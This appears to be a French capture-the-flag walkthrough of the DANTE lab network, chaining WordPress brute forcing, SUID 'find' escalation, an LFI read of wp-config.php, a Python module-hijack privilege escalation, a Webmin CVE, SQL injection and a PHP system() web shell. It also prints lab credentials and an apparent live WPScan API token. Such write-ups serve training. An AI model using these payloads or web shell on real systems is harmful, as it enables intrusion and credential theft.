 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
 |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 5.4.15
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 5.4.15
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 5.4.18
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 5.4.18
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating Most Popular Plugins (via Passive Methods)

[i] No plugins Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Fri Jul 10 00:27:04 2026
[+] Requests Done: 37
[+] Cached Requests: 6
[+] Data Sent: 10.921 KB
[+] Data Received: 373.729 KB
[+] Memory used: 256.418 MB
[+] Elapsed time: 00:00:4
```

Les differents vulnerabilitee trouver ici sont exploitable apres avoir un connection a la page admin de wordpress donc nous devons trouver un moyens pour nous connecter

## Brute Force

### Creation d'une wordlist

```js
http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks/  -w list.txt
```

### Attack

```js
wpscan --password-attack xmlrpc -t 20 -U user.txt -P list.txt --url http://10.10.110.100:65000/wordpress --api-token CWDkfvUj0UACC5L8jqPnOYrJMApXaa6Vl6sCMFHQAtA
```
La wordlist creer n'as rien donne alors je tente la `Rockyou`

```js
wpscan --password-attack xmlrpc -t 20 -U user.txt -P /usr/share/wordlist/rockyou.txt --url http://10.10.110.100:65000/wordpress --api-token CWDkfvUj0UACC5L8jqPnOYrJMApXaa6Vl6sCMFHQAtA
```
### Mot de passe Trouver : [Toyota]

## Connexion a la page admin

![](/assets/IMG-20260714172130764.png)

![](/assets/IMG-20260714172130803.png)
Nous pouvons voir ici que notre user `james` est admin donc potentiellement nous pouvons exploiter ce dernier sans restriction de privilege

## Injection de code malveillant dans un endpoint d'un plugin

![](/assets/IMG-20260714172130835.png)

## Lancer penelope a cote pour avoir un reverse shell

```js
penelope -p 9001
```

![](/assets/IMG-20260714172130876.png)


### Obtention d'un shell

![](/assets/IMG-20260714172130917.png)


## Exploitation de la premiere machine du reseau 10.10.110.100

![](/assets/IMG-20260714172130951.png)

nous nous sommes connecter en temps que `www-data` nous allons tenter d'elever nos privilege a root et essayer de pivoter sur le reseau

## Trouvaille 
	Dans le repertoire de james auquel nous avons acces nous pouvons remarquer que le .bash_history n'est pas rediriger vers /dev/null ce qui veut dire que nous pouvons lire sont contenu. De ce fait nous avons trouver les creds de la database `mysql`

```js
balthazar:TheJoker12345!
```

Quand j'ai essayer de me connecter a la base de donne, je peut voir que ca passait pas alors j'ai tenter d'elever mes privileges en devenant `balthazar` et ca a marcher

![](/assets/IMG-20260714172130993.png)

```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        
172.16.1.10   DANTE-NIX02        
172.16.1.12   DANTE-NIX07        
172.16.1.13   DANTE-WS01         
172.16.1.17   DANTE-NIX03        
172.16.1.19   DANTE-JENKINS      
172.16.1.20   DANTE-DC01         
172.16.1.100  DANTE-WEB-NIX01    
172.16.1.101  DANTE-WS02         
172.16.1.102  DANTE-WS03         
172.16.2.5    DANTE-DC02         
172.16.2.101  DANTE-ADMIN-NIX05  
172.16.2.6    DANTE-ADMIN-NIX06
```
---
# 10.16.1.100: DANTE-WEB-NIX01
```js
User: Balthazar | Pass: TheJoker12345!
```


## Se connecter en temps que james

![](/assets/IMG-20260714172131045.png)

```js
User: james | Pass: Toyota
```


### [Flag2 : DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}]

Durant mon enumeration pour elever mes privileges , j'ai trouver un SUID assez interresant : `find`

![](/assets/IMG-20260714172131099.png)

et avec gtfobins j'ai vu que je pourrais l'exploiter pour elever mes privileges

![](/assets/IMG-20260714172131134.png)

[Charge Utiles : ] `find . -exec /bin/sh -p \; -quit`

![](/assets/IMG-20260714172131168.png)

Nous somme `root`

### [Flag3 : DANTE{Too_much_Pr1v!!!!}]

```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        
172.16.1.10   DANTE-NIX02        
172.16.1.12   DANTE-NIX07        
172.16.1.13   DANTE-WS01         
172.16.1.17   DANTE-NIX03        
172.16.1.19   DANTE-JENKINS      
172.16.1.20   DANTE-DC01         
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         
172.16.1.102  DANTE-WS03         
172.16.2.5    DANTE-DC02         
172.16.2.101  DANTE-ADMIN-NIX05  
172.16.2.6    DANTE-ADMIN-NIX06
```

---
# Place au pivoting : 172.16.1.0/24
## Nous allons enumerer tout les ip qui sont active sur le reseau

![](/assets/IMG-20260714172131211.png)

L'addresse ip de la machine est le `172.16.1.100`

j'ai personnaliser un script bash pour enumerer tout les ip du reseau qui peuvent communiquer avec cette machine

```bash
#!/bin/bash

# Sous-réseau à scanner (modifie selon ton réseau)
RESEAU="172.16.1"
# Fichier de log (optionnel)
LOGFILE="ping_log.txt"

# Nettoyage du fichier log précédent
> "$LOGFILE"

echo "Début du scan de $RESEAU.0/24 ..."
echo "----------------------------------"

# Boucle sur les 254 adresses possibles
for i in {1..254}; do
    IP="$RESEAU.$i"
    
    # Ping silencieux, 1 paquet, timeout 1s
    ping -c 1 -W 1 "$IP" > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        echo "[+] Hôte actif : $IP"
        echo "$IP" >> "$LOGFILE"
    else
        echo "[-] Pas de réponse : $IP"
    fi
done

echo "----------------------------------"
echo "Scan terminé. Résultats enregistrés dans $LOGFI
```

![](/assets/IMG-20260714172131260.png)

## IP
```js
172.16.1.5
172.16.1.10
172.16.1.12
172.16.1.13
172.16.1.17
172.16.1.19
172.16.1.20
172.16.1.100 [Pwned!]
172.16.1.101
172.16.1.102
```
c'est bon nous avons enumerer tout les ip du reseau qui peuvent communiquer avec notre machine place au pivoting 

pour ce dernier je vais opter pour `Ligolo` un outils de pivoting ultra puissant

![](/assets/IMG-20260714172131291.png)

Connexion etabli
![](/assets/IMG-20260714172131329.png)

---
# 172.16.1.10 : DANTE-NIX02

## Enumeration des ports ouverts et services

```js
nmap -sV -sC 172.16.1.10 -Pn
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-10 11:55 +0000
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 172.16.1.10
Host is up (0.94s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5a:9c:1b:a5:c1:7f:2d:4f:4b:e8:cc:7b:e4:47:bc:a9 (RSA)
|   256 fd:d6:3a:3f:a8:04:56:4c:e2:76:db:85:91:0c:5e:42 (ECDSA)
|_  256 e2:d5:17:7c:58:75:26:5b:e1:1b:98:39:3b:2c:6c:fc (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Dante Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-NIX02, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -4s
| smb2-time: 
|   date: 2026-07-10T11:56:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.62 seconds
```

## Enumeration

```js
enum4linux -a 172.16.1.10
```

```js
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jul 10 11:59:16 2026

 =========================================( Target Information )=========================================

Target ........... 172.16.1.10
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 172.16.1.10 )============================


[+] Got domain/workgroup name: WORKGROUP


 ================================( Nbtstat Information for 172.16.1.10 )================================

Looking up status of 172.16.1.10
	DANTE-NIX02     <00> -         B <ACTIVE>  Workstation Service
	DANTE-NIX02     <03> -         B <ACTIVE>  Messenger Service
	DANTE-NIX02     <20> -         B <ACTIVE>  File Server Service
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================( Session Check on 172.16.1.10 )====================================


[+] Server 172.16.1.10 allows sessions using username '', password ''


 =================================( Getting domain SID for 172.16.1.10 )=================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ===================================( OS information on 172.16.1.10 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 172.16.1.10 from srvinfo: 
	DANTE-NIX02    Wk Sv PrQ Unx NT SNT DANTE-NIX02 server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 ========================================( Users on 172.16.1.10 )========================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ==================================( Share Enumeration on 172.16.1.10 )==================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	SlackMigration  Disk      
	IPC$            IPC       IPC Service (DANTE-NIX02 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.16.1.10 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.16.1.10

//172.16.1.10/print$	Mapping: DENIED Listing: N/A Writing: N/A
//172.16.1.10/SlackMigration	Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//172.16.1.10/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 172.16.1.10 )============================

Password: 


[+] Attaching to 172.16.1.10 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] DANTE-NIX02
	[+] Builtin

[+] Password Info for Domain: DANTE-NIX02

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 136 years 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 136 years 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 =======================================( Groups on 172.16.1.10 )=======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ===================( Users on 172.16.1.10 via RID cycling (RIDS: 500-550,1000-1050) )===================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-21-481583869-3247998466-335665969 and logon username '', password ''

S-1-5-21-481583869-3247998466-335665969-501 DANTE-NIX02\nobody (Local User)
S-1-5-21-481583869-3247998466-335665969-513 DANTE-NIX02\None (Domain Group)

```

## SMB Enumeration
Avec `enum4linux` nous avons eu comme information de se connecter au smb anonymement

![](/assets/IMG-20260714172131369.png)

### Trouvaille

```js
user : margaret
```

## HTTP Enumeration

![](/assets/IMG-20260714172131441.png)

![](/assets/IMG-20260714172131491.png)

Path traversal decouvert 

Avec la piste trouver dans le ficher.txt trouver dans le SMB, nous pouvons tenter de lire les ficher de configuration du wordpress

![](/assets/IMG-20260714172131525.png)


**Utilise `php://filter` pour lire le code source PHP en base64** (utile si l'inclusion exécute le PHP au lieu de l'afficher en clair)

```js
curl "http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php"
```

![](/assets/IMG-20260714172131566.png)


### Dechiffrer et voir le contenu en clair

```js
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

Creds Trouver
```js
margaret:Welcome1!2@3#
```

## Connexion au serveur

![](/assets/IMG-20260714172131609.png)

## On dirait que je suis tomber sur un restricted shell classique

![](/assets/IMG-20260714172131643.png)

Bypasse de ce dernier avec ceci

```js
:set shell=/bin/sh
:shell
```

![](/assets/IMG-20260714172131678.png)


### [Flag4 : DANTE{LF1_M@K3s_u5_lol}]

En continuant l'enumeration j'ai trouver des fichers specials `*.json` avec un contenu contenant des infos sensibles

```js
Credentials découverts (Slack export)

Utilisateurs Slack identifiés :

- Frank (`htb_donotuse`) — admin/owner du workspace, email `HTB_DONOTUSE@protonmail.com`
- Margaret (`thisissecretright`) — utilisatrice standard, email `thisissecretright@protonmail.com`

Conversation clé dans le canal privé "secure" (2020-05-18) :

1. Frank donne à Margaret un mot de passe pour les "images Ubuntu" :
    
    ```
    STARS5678FORTUNE401
    ```
    
2. Plus tard, Margaret est promue admin, demande à Frank de :
    
    - Lui retirer ses propres privilèges admin
    - Se créer un compte admin à sa place
3. Margaret donne ensuite à Frank un nouveau mot de passe sur la boîte Ubuntu :
    
    ```
    Username: (même username que Frank utilise déjà)
    Password: TractorHeadtorchDeskmat
    ```

```

## Creds

```js
user: frank | pass: TractorHeadtorchDeskmat
```

![](/assets/IMG-20260714172131722.png)

```python
import call
import urllib
url = urllib.urlopen(localhost)
page= url.getcode()
if page ==200:
    print ("We're all good!")
else:
    print("We're failing!")
    call(["systemctl start apache2"], shell=True)
```

Deux points critiques :

1. **`import call`** est invalide en Python standard — il n'existe pas de module `call` natif. Le code veut clairement dire `from subprocess import call`, mais tel quel, **Python va chercher un module nommé `call.py` n'importe où dans son `sys.path`**, y compris dans le répertoire courant du script.
2. Le fichier `apache_restart.py` est `r--r--r--` (donc toi tu ne peux pas l'éditer), **mais le dossier `/home/frank` t'appartient** (`drwxr-xr-x frank frank`) → tu peux créer un nouveau fichier dedans.
3. Le `__pycache__` appartenant à **root** dans ce home directory est le vrai indice : ça prouve que ce script est **exécuté par root** (probablement via un cron job), et que Python y a déjà compilé du bytecode.

### Exploitation : hijack du module `call`

**1. Crée ton propre `call.py` malveillant dans le home de frank**

```bash
cat > /home/frank/call.py << 'EOF'
import os
os.system("chmod +s /bin/bash")
EOF
```

Ou pour un reverse shell direct :

```bash
cat > /home/frank/call.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
EOF
```

**2. Attends l'exécution du cron (ou vérifie sa fréquence)**

```bash
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l 2>/dev/null
```

**3. Une fois exécuté par root, tu récupères un shell root**

```bash
/tmp/rootbash -p
```

et Bim je suis root

![](/assets/IMG-20260714172131762.png)

### [Flag5 : DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}]

```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        
172.16.1.10   DANTE-NIX02        [pwned!]
172.16.1.12   DANTE-NIX07        
172.16.1.13   DANTE-WS01         
172.16.1.17   DANTE-NIX03        
172.16.1.19   DANTE-JENKINS      
172.16.1.20   DANTE-DC01         
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         
172.16.1.102  DANTE-WS03         
172.16.2.5    DANTE-DC02         
172.16.2.101  DANTE-ADMIN-NIX05  
172.16.2.6    DANTE-ADMIN-NIX06
```

---
# 172.16.1.17 : DANTE-NIX03

## Enumeration des ports ouverts et services

```js
nmap -sV -sC 172.16.1.17 -Pn
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-10 13:17 +0000
Nmap scan report for 172.16.1.17
Host is up (1.7s latency).
Not shown: 996 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.41
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 37M   2020-06-25 13:00  webmin-1.900.zip
| -     2020-07-13 02:21  webmin/
|_
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
10000/tcp open  http        MiniServ 1.900 (Webmin httpd)
|_http-title: Login to Webmin
|_http-server-header: MiniServ/1.900
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: Host: 127.0.0.1

Host script results:
| smb2-time: 
|   date: 2026-07-10T13:18:19
|_  start_date: N/A
|_nbstat: NetBIOS name: DANTE-NIX03, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.22 seconds
```

## SMB Enumeration

![](/assets/IMG-20260714172131797.png)

Connexion anonyme au SMB approuver

### Recuperation d'un ficher monitor

![](/assets/IMG-20260714172131843.png)

#### Creds
```js
user: admin | pass: Password6543
```

## HTTP Enumeration

![](/assets/IMG-20260714172131883.png)

### Connexion a la page admin avec les creds trouves

![](/assets/IMG-20260714172131927.png)

Bon nous sur du webmin 1.900 vuln a un CVE : CVE-2019-9624

### PoC ou metasploit (msfconsole)
https://github.com/x0rbeexd/CVE-2019-9624/blob/main/exploit.py

## Exploitation

![](/assets/IMG-20260714172131962.png)

## Connection a la machine

![](/assets/IMG-20260714172131998.png)


### [Flag6 : DANTE{SH4RKS_4R3_3V3RYWHERE}]


```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        
172.16.1.10   DANTE-NIX02        [pwned!]
172.16.1.12   DANTE-NIX07        
172.16.1.13   DANTE-WS01         
172.16.1.17   DANTE-NIX03        [pwned!]
172.16.1.19   DANTE-JENKINS      
172.16.1.20   DANTE-DC01         
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         
172.16.1.102  DANTE-WS03         
172.16.2.5    DANTE-DC02         
172.16.2.101  DANTE-ADMIN-NIX05  
172.16.2.6    DANTE-ADMIN-NIX06
```

---
# 172.16.1.13 : DANTE-WS01
## Enumeration des ports ouverts et services

```js
nmap -sV -sC 172.16.1.13 -Pn
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-10 13:18 +0000
Nmap scan report for 172.16.1.13
Host is up (0.40s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.13/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
443/tcp open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.13/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
|_ssl-date: TLS randomness does not represent time
445/tcp open  microsoft-ds?

Host script results:
| smb2-time: 
|   date: 2026-07-10T13:20:17
|_  start_date: N/A
|_nbstat: NetBIOS name: DANTE-WS01, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:2b:2d:51 (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.75 seconds
```

## SMB Enumeration

![](/assets/IMG-20260714172132040.png)

La connexion anonyme semble ne pas marcher donc il nous faudra des creds

## HTTP Enumeration

![](/assets/IMG-20260714172132134.png)


### Enumeration des repertoires

![](/assets/IMG-20260714172132166.png)


```js
http://172.16.1.13/discuss
```

![](/assets/IMG-20260714172132205.png)


## Trouvaille

```js
user : james
```

![](/assets/IMG-20260714172132249.png)

Connection au compte admin a travers une SQL Injection

![](/assets/IMG-20260714172132325.png)

```js
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>

```
Creation d'un web shell car apres avoir effectuer plusieur enumeration sur ce dernier jai decouvert qu'il a possibilite d'uploader un ficher et le retrouver dans `/ups`

![](/assets/IMG-20260714172132356.png)

![](/assets/IMG-20260714172132400.png)

Avec des payload de reverse standart l'AV de la machine bloque la connexion 
![](/assets/IMG-20260714172132445.png)

Danc ce cas apres quelque recherche j'ai trouver une technique qui consistait a importer `netcat` sur la machine et qui sera utiliser pour lancer le payload

![](/assets/IMG-20260714172132528.png)

![](/assets/IMG-20260714172132564.png)

Connexion reussi
![](/assets/IMG-20260714172132655.png)

